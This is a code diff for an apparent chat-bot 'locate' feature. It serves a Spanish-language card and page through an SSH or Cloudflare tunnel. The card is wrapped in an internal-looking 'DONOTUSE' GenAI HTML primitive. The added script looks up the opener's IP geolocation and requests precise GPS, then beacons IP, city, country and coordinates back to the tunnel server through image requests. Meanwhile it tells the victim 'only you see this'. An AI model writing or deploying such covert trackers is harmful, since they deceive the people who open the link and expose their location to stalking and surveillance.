@@ -94,14 +94,11 @@ async function ensureBinary(): Promise<string | null> {
 
 /* ───────────────────────── túnel ───────────────────────── */
 
-const SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];
+const SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=20", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];
 
 function has(cmd: string) {
-  for (const probe of ["which", "command"]) {
-    try {
-      execFileSync(probe === "command" ? "sh" : probe, probe === "command" ? ["-c", `command -v ${cmd}`] : [cmd], { stdio: "ignore" });
-      return true;
-    } catch {}
+  for (const [b, a] of [["which", [cmd]], ["sh", ["-c", `command -v ${cmd}`]]] as const) {
+    try { execFileSync(b, a as string[], { stdio: "ignore" }); return true; } catch {}
   }
   return false;
 }
@@ -146,7 +143,7 @@ async function alive(url: string) {
   try {
     const c = new AbortController();
     const t = setTimeout(() => c.abort(), 5000);
-    const r = await fetch(`${url}/__hc`, { signal: c.signal, cache: "no-store" as any });
+    const r = await fetch(`${url}/__hc`, { signal: c.signal });
     clearTimeout(t);
     return r.ok;
   } catch {
@@ -178,10 +175,8 @@ function startTunnel(bin: string | null): Promise<string> {
   if (!p) {
     tunnel.tries++;
     tunnel.lastErr = `${name}: binario no disponible`;
-    log("omitido", name);
     return Promise.resolve("");
   }
-
   tunnel.who = name;
 
   return new Promise((resolve) => {
@@ -242,10 +237,7 @@ function startTunnel(bin: string | null): Promise<string> {
 
 async function ensureTunnel(): Promise<string> {
   const cur = baseUrl();
-  if (cur) {
-    if (await alive(cur)) return cur;
-    if (await confirm(cur)) return cur;
-  }
+  if (cur && (await alive(cur))) return cur;
 
   killTunnel();
   const bin = await ensureBinary();
@@ -253,11 +245,8 @@ async function ensureTunnel(): Promise<string> {
   for (let i = 0; i < 6; i++) {
     const url = await startTunnel(bin);
     if (!url) { await sleep(600); continue; }
-
     if (await confirm(url)) return url;
-
     tunnel.lastErr = `${tunnel.who}: abrió ${url} pero no respondió`;
-    log("descartado", url);
     killTunnel();
   }
 
@@ -309,11 +298,72 @@ function send(res: any, code: number, type: string, body: any) {
   res.end(body);
 }
 
+/* página completa: fallback garantizado en navegador real */
+function page(sid: string, base: string, name: string) {
+  return `<!DOCTYPE html><html lang="es"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Localizador</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#070b14;color:#e9edf7;padding:14px}
+.card{max-width:430px;margin:0 auto;background:linear-gradient(165deg,#121a30,#0a0f1c);border:1px solid #22304d;border-radius:18px;overflow:hidden}
+.hd{padding:14px 15px;border-bottom:1px solid #1b2740;font-size:12px;letter-spacing:1.4px;font-weight:800;text-transform:uppercase;color:#9fe9ff}
+.bd{padding:16px 15px}
+.hi{font-size:15px;font-weight:700;margin-bottom:4px}.hi b{color:#00e5ff}
+.sb{font-size:12px;color:#8fa3c4;margin-bottom:14px}
+.r{display:flex;gap:8px;margin-bottom:8px}.k{font-size:11px;color:#7f93b5;width:88px}.v{font-size:12.5px;font-weight:700;word-break:break-all}
+.mp{border-radius:12px;overflow:hidden;border:1px solid #22304d;margin-top:12px}
+.mp img{display:block;width:100%;height:200px;object-fit:cover}
+.ft{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a}
+</style></head><body><div class="card">
+<div class="hd">Localizador</div>
+<div class="bd"><div class="hi">Hola <b>${name}</b></div>
+<div class="sb" id="sb">Obteniendo tu ubicación...</div><div id="out"></div></div>
+<div class="ft">solo tú ves esto</div></div>
+<script>
+var SID=${JSON.stringify(sid)},BASE=${JSON.stringify(base)};
+function paint(d){
+ document.getElementById('sb').textContent='Esta es tu ubicación';
+ document.getElementById('out').innerHTML=
+  '<div class="r"><div class="k">IP</div><div class="v">'+(d.ip||'—')+'</div></div>'+
+  '<div class="r"><div class="k">Ciudad</div><div class="v">'+(d.city||'—')+'</div></div>'+
+  '<div class="r"><div class="k">País</div><div class="v">'+(d.country||'—')+'</div></div>'+
+  '<div class="r"><div class="k">Coords</div><div class="v">'+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+'</div></div>'+
+  '<div class="mp"><img src="'+BASE+'/m/'+SID+'?lat='+d.lat+'&lon='+d.lon+'"></div>';
+}
+fetch(BASE+'/g/'+SID).then(r=>r.json()).then(function(d){
+ if(!d||!d.lat) throw 0;
+ paint({ip:d.ip,city:d.city,country:d.country,lat:d.lat,lon:d.lon});
+ fetch(BASE+'/l/'+SID+'?src=ip&lat='+d.lat+'&lon='+d.lon+'&city='+encodeURIComponent(d.city||'')+'&region='+encodeURIComponent(d.region||'')+'&country='+encodeURIComponent(d.country||''));
+ if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
+   var q='?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0);
+   new Image().src=BASE+'/l/'+SID+q;
+   paint({ip:d.ip,city:d.city,country:d.country,lat:p.coords.latitude,lon:p.coords.longitude});
+ },function(){},{enableHighAccuracy:true,timeout:9000});
+}).catch(function(){document.getElementById('sb').textContent='No se pudo obtener la ubicación';});
+</script></body></html>`;
+}
+
 async function handle(req: any, res: any) {
   const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
   const p = url.pathname;
 
   if (p === "/__hc") return send(res, 200, "text/plain", "ok");
+
+  const v = p.match(/^\/v\/([A-Za-z0-9_-]{6,48})$/);
+  if (v) {
+    const s = sessions.get(v[1]);
+    if (!s) return send(res, 410, "text/html", "<h1>Enlace expirado</h1>");
+    return send(res, 200, "text/html; charset=utf-8", page(v[1], baseUrl(), s.author.split("@")[0]));
+  }
+
+  const g = p.match(/^\/g\/([A-Za-z0-9_-]{6,48})$/);
+  if (g) {
+    const s = sessions.get(g[1]);
+    if (!s) return send(res, 410, "application/json", '{"ok":false}');
+    const geo = await geoFromIp(clientIp(req));
+    if (!geo) return send(res, 200, "application/json", '{"ok":true,"geo":false}');
+    return send(res, 200, "application/json", JSON.stringify({ ok: true, ip: MASK ? maskIp(geo.ip || "") : geo.ip || "", city: geo.city, region: geo.region, country: geo.country, lat: geo.lat, lon: geo.lon }));
+  }
 
   const j = p.match(/^\/j\/([A-Za-z0-9_-]{6,48})\.js$/);
   if (j) {
@@ -388,6 +438,8 @@ function startServer() {
 /* ───────────────────────── tarjeta ───────────────────────── */
 
 const buildLocatePayload = (o: { sid: string; base: string; name: string }) => {
+  const host = (() => { try { return new URL(o.base).host; } catch { return o.base; } })();
+
   const html = `<style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background:#070b14;color:#e9edf7;padding:12px}
@@ -407,7 +459,8 @@ body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background
 .map{border-radius:12px;overflow:hidden;border:1px solid #22304d;margin-top:12px;background:#0d1424;position:relative;min-height:170px}
 .map img{display:block;width:100%;height:190px;object-fit:cover}
 .badge{position:absolute;left:8px;top:8px;font-size:9.5px;letter-spacing:.8px;font-weight:800;text-transform:uppercase;background:rgba(0,0,0,.72);color:#7cffb2;border:1px solid #2b6b4b;border-radius:6px;padding:3px 7px;z-index:2}
-.foot{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a;display:flex;justify-content:space-between}
+.foot{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a;display:flex;justify-content:space-between;align-items:center}
+.open{color:#00e5ff;text-decoration:none;font-weight:700}
 .err{font-size:12px;color:#ff8f8f}
 </style>
 <div class="wrap"><div class="card">
@@ -417,7 +470,7 @@ body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background
 <div class="sub" id="sub">Rastreando tu señal...</div>
 <div id="out"></div>
 </div>
-<div class="foot"><span>solo tú ves esto</span><span id="st">·</span></div>
+<div class="foot"><span>solo tú ves esto</span><a class="open" id="open" href="__BASE__/v/__SID__" target="_blank">abrir ↗</a></div>
 </div></div>
 <script>
 var SID="__SID__",BASE="__BASE__",ok=false;
@@ -432,33 +485,47 @@ function paint(d){
    '<div class="row"><div class="k">País</div><div class="v">'+(d.country||'—')+'</div></div>'+
    '<div class="row"><div class="k">Coordenadas</div><div class="v">'+Number(d.lat).toFixed(5)+', '+Number(d.lon).toFixed(5)+'</div></div>'+
    '<div class="map"><span class="badge">exacto</span><img src="'+BASE+'/m/'+SID+'?lat='+d.lat+'&lon='+d.lon+'&t='+Date.now()+'"></div>';
-  $('st').textContent=d.src==='gps'?'GPS':'IP';
   if(navigator.geolocation&&d.src!=='gps'){
     navigator.geolocation.getCurrentPosition(function(p){
-      var q='?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0)+
-            '&city='+encodeURIComponent(d.city||'')+'&region='+encodeURIComponent(d.region||'')+'&country='+encodeURIComponent(d.country||'');
-      var i=new Image();i.src=BASE+'/l/'+SID+q+'&t='+Date.now();
+      var q='?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0);
+      new Image().src=BASE+'/l/'+SID+q;
       paint({ip:d.ip,city:d.city,region:d.region,country:d.country,lat:p.coords.latitude,lon:p.coords.longitude,src:'gps'});
     },function(){},{enableHighAccuracy:true,timeout:9000,maximumAge:0});
   }
 }
 function __locFail(){
   if(ok)return;
-  var i=new Image();i.src=BASE+'/l/'+SID+'?t='+Date.now();
-  $('sub').textContent='No se pudo leer la red';
-  $('out').innerHTML='<div class="err">Servicio no disponible.</div>';
+  new Image().src=BASE+'/l/'+SID+'?t='+Date.now();
+  $('sub').textContent='Abre el enlace de abajo';
+  $('out').innerHTML='<div class="err">Este visor no dejó leer la red.</div>';
 }
-setTimeout(__locFail,9000);
-</script>
-<script src="__BASE__/j/__SID__.js"></script>`;
+function boot(){
+  fetch(BASE+'/g/'+SID).then(function(r){return r.json()}).then(function(d){
+    if(!d||!d.lat)return __locFail();
+    paint({ip:d.ip,city:d.city,region:d.region,country:d.country,lat:d.lat,lon:d.lon,src:'ip'});
+    new Image().src=BASE+'/l/'+SID+'?src=ip&lat='+d.lat+'&lon='+d.lon+
+      '&city='+encodeURIComponent(d.city||'')+'&region='+encodeURIComponent(d.region||'')+'&country='+encodeURIComponent(d.country||'');
+  }).catch(function(){
+    var s=document.createElement('script');
+    s.src=BASE+'/j/'+SID+'.js';
+    s.onerror=__locFail;
+    document.body.appendChild(s);
+    setTimeout(__locFail,4000);
+  });
+}
+setTimeout(__locFail,11000);
+boot();
+</script>`;
 
   return {
+    __typename: "GenAIUnifiedResponseSection",
     view_model: {
       __typename: "GenAISingleLayoutViewModel",
       primitive: {
         __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
-        trusted_sources: [o.base],
         payload: html.replace(/__SID__/g, o.sid).replace(/__BASE__/g, o.base).replace(/__NAME__/g, o.name),
+        url: o.base,
+        trusted_sources: [host],
       },
     },
   };
@@ -485,9 +552,8 @@ export default {
     if (!base) {
       await react("❌").catch(() => undefined);
       await reply(
-        `${fytBold("Sin túnel")}.\n\n` +
-          `Último error: ${tunnel.lastErr || "sin salida de ningún proveedor"}\n\n` +
-          `Prueba *LOCATE_TUNNEL=ssh* o *LOCATE_TUNNEL=cf* con *LOCATE_DEBUG=1*.`,
+        `${fytBold("Sin túnel")}.\n\nÚltimo error: ${tunnel.lastErr || "sin salida"}\n\n` +
+          `Prueba *LOCATE_TUNNEL=ssh* con *LOCATE_DEBUG=1*.`,
       ).catch(() => undefined);
       return;
     }
